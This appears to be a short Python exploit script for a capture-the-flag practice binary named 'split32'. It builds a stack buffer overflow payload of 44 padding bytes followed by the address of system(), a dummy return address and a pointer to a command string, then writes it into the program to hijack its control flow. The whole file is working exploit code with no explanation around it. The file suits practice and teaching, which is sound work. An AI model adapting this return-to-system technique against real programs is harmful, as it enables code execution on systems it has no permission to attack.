import os, struct

system = struct.pack("I", 0x08048430)
cat = struct.pack("I", 0x804a030)

payload = "A"*44 + system + "BBBB" + cat

split = os.popen('./split32', 'w')
split.write(payload)




